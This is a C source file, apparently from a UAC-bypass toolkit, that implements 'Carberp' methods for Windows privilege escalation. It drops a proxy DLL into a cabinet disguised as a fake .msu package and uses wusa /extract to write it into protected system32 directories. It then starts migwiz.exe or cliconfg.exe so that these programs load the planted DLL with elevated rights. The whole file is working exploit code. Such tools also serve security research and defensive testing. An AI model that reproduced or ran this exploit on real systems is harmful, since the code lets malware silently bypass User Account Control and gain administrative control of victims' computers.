/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       CARBERP.C
*
*  VERSION:     2.70
*
*  DATE:        25 Mar 2017
*
*  Tweaked Carberp methods.
*  Original Carberp is exploiting mcx2prov.exe in ehome.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"

/*
* ucmWusaExtractPackage
*
* Purpose:
*
* Extract cab to protected directory using wusa.
* This routine expect source as ellocnak.msu cab file in the temp folder.
*
*/
BOOL ucmWusaExtractPackage(
    _In_ LPWSTR lpTargetDirectory
)
{
    BOOL bResult = FALSE;
    SIZE_T Size;
    LPWSTR lpCommandLine = NULL;
    WCHAR szMsuFileName[MAX_PATH * 2];

    if (lpTargetDirectory == NULL)
        return FALSE;

    RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
    _strcpy(szMsuFileName, g_ctx.szTempDirectory);
    _strcat(szMsuFileName, ELLOCNAK_MSU);

    Size = ((1 + _strlen(lpTargetDirectory) + 
        _strlen(szMsuFileName) + 
        MAX_PATH) * sizeof(WCHAR));

    lpCommandLine = (LPWSTR)supHeapAlloc(Size);
    if (lpCommandLine) {

        _strcpy(lpCommandLine, L"/c wusa ");
        _strcat(lpCommandLine, szMsuFileName);
        _strcat(lpCommandLine, L" /extract:");
        _strcat(lpCommandLine, lpTargetDirectory);

        bResult = supRunProcess(CMD_EXE, lpCommandLine);

        supHeapFree(lpCommandLine);
    }
    DeleteFileW(szMsuFileName);
    return bResult;
}

/*
* ucmWusaMethod
*
* Purpose:
*
* Build and install fake msu package then run target application.
*
*/
BOOL ucmWusaMethod(
    _In_ UCM_METHOD Method,
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL   bResult = FALSE, cond = FALSE;
    WCHAR  szSourceDll[MAX_PATH * 2];
    WCHAR  szTargetProcess[MAX_PATH * 2];
    WCHAR  szTargetDirectory[MAX_PATH * 2];

    if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
        return FALSE;
    }

    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);
    _strcpy(szTargetDirectory, g_ctx.szSystemDirectory);
    _strcpy(szSourceDll, g_ctx.szTempDirectory);

    switch (Method) {

    // 
    // Use migwiz.exe as target.
    // szTargetDirectory is system32\migwiz
    //
    case UacMethodCarberp1:
        _strcat(szSourceDll, WDSCORE_DLL);
        _strcat(szTargetDirectory, MIGWIZ_DIR);
        _strcat(szTargetProcess, MIGWIZ_DIR);
        _strcat(szTargetProcess, MIGWIZ_EXE);
        break;

    //
    // Use cliconfg.exe as target.
    // szTargetDirectory is system32
    //
    case UacMethodCarberp2:
        _strcat(szSourceDll, NTWDBLIB_DLL);       
        _strcat(szTargetProcess, CLICONFG_EXE);
        break;

    default:
        return FALSE;
    }

    if (!PathFileExists(szTargetProcess)) {
        supDebugPrint(TEXT("ucmWusaMethod"), ERROR_FILE_NOT_FOUND);
        return FALSE;
    }

    do {

        //
        // Extract file to the protected directory
        // First, create cab with fake msu ext, second run fusion process.
        //
        if (!ucmCreateCabinetForSingleFile(szSourceDll, ProxyDll, ProxyDllSize)) {
            break;
        }

        if (!ucmWusaExtractPackage(szTargetDirectory)) {
            break;
        }

        //run target process for dll hijacking
        bResult = supRunProcess(szTargetProcess, NULL);

    } while (cond);


    return bResult;
}

/*
* ucmCreateCabinetForSingleFile
*
* Purpose:
*
* Build cabinet for usage in methods where required 1 file.
*
*/
BOOL ucmCreateCabinetForSingleFile(
    _In_ LPWSTR lpSourceDll,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL     cond = FALSE, bResult = FALSE;
    CABDATA *Cabinet = NULL;
    LPWSTR   lpFileName;
    WCHAR    szMsuFileName[MAX_PATH * 2];

    if ((ProxyDll == NULL) || 
        (ProxyDllSize == 0) ||
        (lpSourceDll == NULL)) return bResult;

    do {

        //drop proxy dll
        if (!supWriteBufferToFile(lpSourceDll, ProxyDll, ProxyDllSize)) {
            break;
        }

        //build cabinet
        RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
        _strcpy(szMsuFileName, g_ctx.szTempDirectory);
        _strcat(szMsuFileName, ELLOCNAK_MSU);

        Cabinet = cabCreate(szMsuFileName);
        if (Cabinet == NULL)
            break;

        lpFileName = _filename(lpSourceDll);
        //put file without compression
        bResult = cabAddFile(Cabinet, lpSourceDll, lpFileName);
        cabClose(Cabinet);

    } while (cond);

    return bResult;
}
